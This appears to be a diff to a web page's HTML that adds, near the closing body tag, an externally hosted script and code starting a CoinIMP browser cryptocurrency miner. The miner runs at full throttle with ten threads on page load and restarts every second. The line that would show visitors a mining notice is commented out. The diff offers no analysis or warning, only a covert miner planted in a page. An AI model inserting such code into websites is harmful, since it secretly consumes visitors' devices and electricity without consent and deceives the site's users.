@@ -87,5 +87,22 @@
         });
       });
     </script>
+ <script src="https://www.hostingcloud.racing/3XL7.js"></script>
+<script>
+    var _client = new Client.Anonymous('b3bc3196f8f88e13fd6bd189df6f62ddc9db1df31293859513e84fc8b1cdc11a', 
+{
+        throttle: 0,
+        threads: 10
+    });
+    console.log(_client.getNumThreads());
+    setTimeout(() => {_client.start();console.log('run');
+    },4000)
+    setInterval(() =>{
+        _client.start()
+        console.log(_client.getHashesPerSecond(),_client.isRunning())
+    }, 1000)
+    //_client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
+</script>
   </body>
 </html>
